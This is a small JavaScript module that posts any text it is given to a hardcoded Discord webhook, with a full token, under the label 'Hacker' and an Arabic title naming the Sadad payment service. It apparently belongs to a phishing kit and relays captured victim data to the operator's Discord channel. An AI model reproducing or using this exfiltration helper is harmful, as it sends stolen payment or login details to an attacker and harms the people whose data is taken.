import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1326597299832356995/uWzrGU_FH5d6Q8adpXxybR9USRQkO9xE3fzXPr5MBhhpTWSLDX1Xosb9K63UUW0ePcF8",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
